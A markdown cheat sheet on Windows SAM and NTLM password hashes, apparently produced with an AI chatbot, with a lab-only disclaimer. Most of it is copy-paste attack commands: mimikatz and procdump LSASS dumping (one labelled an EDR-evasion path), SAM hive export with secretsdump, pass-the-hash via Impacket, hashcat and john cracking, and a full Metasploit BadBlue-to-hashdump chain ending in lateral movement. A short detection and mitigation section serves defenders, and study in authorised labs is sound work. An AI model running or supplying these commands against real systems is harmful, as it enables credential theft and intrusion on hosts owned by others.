


# Windows Password Hashes & SAM — Complete Notes (with demo)

> **Scope / warning:** These techniques are for authorized testing, CTFs, and lab learning only. Dumping hashes or accessing LSASS on systems you don't own is illegal. Always follow Rules of Engagement and document everything.

---

## Quick summary (one-liner)
The Windows SAM (Security Accounts Manager) stores user password hashes (NTLM). Unlike `/etc/shadow` on Linux, SAM is locked by the running OS; attackers typically extract hashes from the **LSASS** process memory or export the SAM and SYSTEM registry hives and decrypt the hashes offline.

---

## Short theory: LM vs NTLM vs NT Hash

- **LM (LAN Manager)** — legacy, extremely weak: splits password into two 7-character chunks, uppercases it, uses DES. **Disabled** on modern Windows (Vista+).
- **NTLM / NT Hash (NThash)** — modern default for local accounts. NT hash is basically `MD4(password)` (no key stretching). Case-sensitive, supports Unicode and symbols. Easier to crack than modern salted algorithms.
- **Where hashes live**
  - Standalone Windows machines: local account hashes stored in the **SAM** (registry hive) and protected by SYSTEM (the SYSTEM hive).
  - Domain environments: account/credential data lives on domain controllers (NTDS.dit) — different extraction techniques.

---

## SAM database vs Linux `/etc/shadow`
| Topic | Windows SAM | Linux `/etc/shadow` |
|---|---:|---|
| Purpose | Stores local user account hashes (NTLM) | Stores local user hashes (various schemes, usually salted) |
| Location | Registry hive: `HKLM\SAM` (on disk: `C:\Windows\System32\config\SAM`) | `/etc/shadow` |
| Locking | Locked by OS while running; LSASS holds secrets in memory | Readable only by root; file accessible offline |
| Decryption | SAM entries encrypted with system secret (SYSTEM hive) → need SYSTEM/LSASS or offline copy + SYSTEM hive | Plain hash stored (salted), need root to read |
| Equivalent | Functionally similar to `/etc/shadow` (credentials) | — |

---

## Common extraction strategies (requirements & tradeoffs)

1. **In-memory extraction (LSASS) — live, privileged**
   - Requires **SYSTEM** (or debug) privileges.
   - Tools: `mimikatz` (`sekurlsa::logonpasswords`), or dumping LSASS and parsing offline.
   - Pros: Can yield plaintext creds, Kerberos tickets, cached creds.  
   - Cons: Very noisy; EDRs detect mimikatz and dumps.

2. **Registry hive export (SAM + SYSTEM) — live but offline-style**
   - Save `HKLM\SAM` and `HKLM\SYSTEM` to files (requires SYSTEM).  
   - Use offline tools (e.g., `secretsdump.py`) to decrypt SAM with SYSTEM hive and extract NT hashes.
   - Pros: Offline cracking possible, slightly stealthier if done carefully.  
   - Cons: Requires SYSTEM, careful cleanup.

3. **Volume shadow copy / offline image**
   - Reboot into rescue environment / mount offline OS image.
   - Pros: Low detection.  
   - Cons: Requires console/VM snapshot or physical access.

4. **Network capture & pass-the-hash / relay**
   - Capture NTLM challenge/response or perform relays.
   - Use hashes directly with pass-the-hash (PTH) techniques — may not need to crack.

---

## Practical commands & examples

> **Note:** Most local methods require elevated or SYSTEM privileges.

### 1) Mimikatz (live memory)
```powershell
# On target (elevated)
mimikatz.exe
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords
````

* Returns plaintext creds (if present), NTLM hashes, Kerberos tickets.

---

### 2) Export SAM & SYSTEM (reg save) and parse offline

```powershell
# On target (SYSTEM)
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
# copy to attacker
```



<img width="1318" height="594" alt="image" src="https://github.com/user-attachments/assets/831f8c16-41d0-42c8-a339-dfdcb74901d2" />

On attacker:

```bash
# using Impacket secretsdump (offline)
python3 secretsdump.py -sam SAM -system SYSTEM LOCAL
# or
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

---

### 3) Meterpreter `hashdump` (if meterpreter & admin)

```text
meterpreter> getsystem       # try to elevate to SYSTEM
meterpreter> hashdump
# dumps SAM hashes
```

---

### 4) Dump LSASS using ProcDump + parse offline (EDR-evasion path)

```powershell
# On target (SYSTEM):
procdump -ma lsass.exe C:\Windows\Temp\lsass.dmp

# copy lsass.dmp to attacker and parse with mimikatz:
mimikatz# sekurlsa::minidump lsass.dmp
mimikatz# sekurlsa::logonpasswords
```

---

### 5) Pass-the-Hash (PTH) with Impacket

If you have an NTLM hash:

```bash
# psexec with hash (impacket)
python3 psexec.py Administrator@<target-ip> -hashes :<NTLM_HASH>

# wmiexec with hash
python3 wmiexec.py Administrator@<target-ip> -hashes :<NTLM_HASH>
```

---

### 6) Crack hashes with John / Hashcat

**John the Ripper (example)**

```bash
# list formats and filter for NT/NTLM
john --list=formats | grep -i nt

# run john using a wordlist (rockyou recommended)
# ensure rockyou is decompressed:
gzip -d /usr/share/wordlists/rockyou.txt.gz   # produces /usr/share/wordlists/rockyou.txt

# crack using NT format
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Hashcat (example)**

```bash
# NTLM mode = 1000
# dictionary attack (fast)
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# brute-force example (mask-based) - be careful, this is slow!
# example mask: ?a?a?a?a?a (5 arbitrary chars)
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a
```

---

## Detection & mitigation

* **Enable Credential Guard / LSA protection** to impede credential extraction from LSASS.
* **Least privilege**: avoid running as local admin where unnecessary.
* **Harden LSASS and privilege assignment**: restrict debug privilege.
* **EDR / logging**: detect `procdump`, `mimikatz`, `reg save` or unusual PowerShell activity.
* **Monitor Event IDs:** service creation (7045), registry exports, suspicious scheduled tasks.
* **Rotate passwords** and limit cached credentials.

---

## Practical takeaways & comparisons

* SAM (Windows) and `/etc/shadow` (Linux) are conceptually similar: both store credential hashes.
* Windows SAM is protected by the OS and encrypted with the SYSTEM secret; attackers target LSASS memory or export hives.
* NTLM hashes can often be reused (PTH), so cracking is not always required.
* Cracking reveals plaintext; PTH allows immediate lateral movement.

---

## Tools & references

* `mimikatz` — in-memory credential extraction
* `impacket` (secretsdump.py, psexec.py, wmiexec.py) — offline parsing & remote auth
* `procdump` / Sysinternals — dump LSASS
* `hashcat`, `john` — cracking tools
* MITRE ATT&CK — Credential Access techniques (T1003 etc.)

---

## Demo: full workflow (from discovery to cracking) — addendum

> **Goal:** discover a vulnerable HTTP service, exploit it to gain admin, dump NTLM hashes from LSASS, and crack them.

### 1) Discovery & exploit

```bash
nmap -sV <target-ip>
# find BadBlue (example)
```

In `msfconsole`:

```text
search badblue_passthru
use exploit/windows/http/badblue_passthru
set RHOST <target-ip>
set RPORT <port>        # if not default
exploit
```

You obtain a Meterpreter session:

```text
meterpreter> sysinfo
meterpreter> getuid
meterpreter> getprivs      # verify if admin/SYSTEM privileges present
```

### 2) Migrate into LSASS and extract hashes

LSASS stores many authentication artifacts; migrating into a stable process and then into a privileged context helps.

```text
meterpreter> pgrep lsass
# or use `ps` to find lsass PID (e.g., 1234)
meterpreter> migrate <pid-of-lsass>   # NOTE: migrating directly into lsass may fail; typical pattern is migrate to a privileged process (like lsass's parent or explorer) and then use getsystem
```

**Common safer pattern:**

* `ps` → find `lsass.exe` PID but do not always migrate into LSASS (many protections). You can migrate to `explorer.exe` or another stable process with SYSTEM privileges (after getsystem).

Once you have SYSTEM or adequate privilege:

```text
meterpreter> hashdump
# or load kiwi in Meterpreter (kiwi is mimikatz-like)
meterpreter> load kiwi
meterpreter> kiwi_cmd.exe sekurlsa::logonpasswords
```

* You receive NTLM hashes. Copy the NTLM hash lines and save them into `hashes.txt` on your attacker machine:

```bash
echo 'Administrator:500:...:NTLM_HASH:::': >> hashes.txt
# or create a file with just hash strings (format depends on cracking tool)
```

### 3) Crack hashes with John the Ripper

Prepare wordlist:

```bash
# decompress rockyou if needed
gzip -d /usr/share/wordlists/rockyou.txt.gz   # now available at /usr/share/wordlists/rockyou.txt
```

List available formats and find NT/NTLM:

```bash
john --list=formats | grep -i nt
```

Run john (NT format):

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

* If you do not pass `--wordlist`, John uses its default (often `/usr/share/john/password.lst`), but rockyou is recommended.

### 4) Crack with Hashcat (GPU / faster)

Hash mode for NTLM = `1000`.

Dictionary attack:

```bash
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Mask / brute-force attack (example mask, careful with time):

```bash
# mask example for 6-char arbitrary: ?a?a?a?a?a?a
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a
```

**Notes:**

* `-m` specifies the hash mode (1000 = NTLM).
* `-a 0` = dictionary attack; `-a 3` = brute-force (mask).
* For large masks, brute force will take impractical time; prefer targeted masks or wordlists.

### 5) Use credentials (if cracked) or reuse via PTH

* Use plaintext creds for SSH, RDP, WinRM.
* Or use the NTLM hash for pass-the-hash with Impacket:

```bash
python3 psexec.py Administrator@<target-ip> -hashes :<NTLM_HASH>
```

---

## Example quick checklist (copy/paste)

```text
1. nmap -sV <target-ip> : find vulnerable service (e.g., BadBlue)
2. msfconsole: exploit the service (badblue_passthru) → get Meterpreter
3. meterpreter> sysinfo; getuid; getprivs
4. Find a stable privileged process (ps), migrate, attempt getsystem
5. If SYSTEM, use hashdump OR load kiwi / mimikatz to extract NTLM hashes
6. Save hash lines to hashes.txt on attacker
7. Decompress rockyou: gzip -d /usr/share/wordlists/rockyou.txt.gz
8. Crack with John:
   john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
9. Or crack with Hashcat (GPU):
   hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
10. Use cracked creds or pass-the-hash for lateral movement
11. Document everything and clean up per RoE
```

---

## Final practical notes

* Some environments (Credential Guard, LSA protection, modern EDR) make extracting credentials more difficult — adjust methods accordingly.
* Dumping LSASS or running mimikatz is noisy; expect alerts on well-defended networks.
* Always test in a lab first and ensure you have permission before performing any of these actions.

---

If you want, I can generate a single-file `windows_hashes_and_demo.md` that you can drop into your GitHub repo (this file), or create a companion `hashing_cheatsheet.txt` with the exact copy-paste commands only. Which would you prefer?

```
```
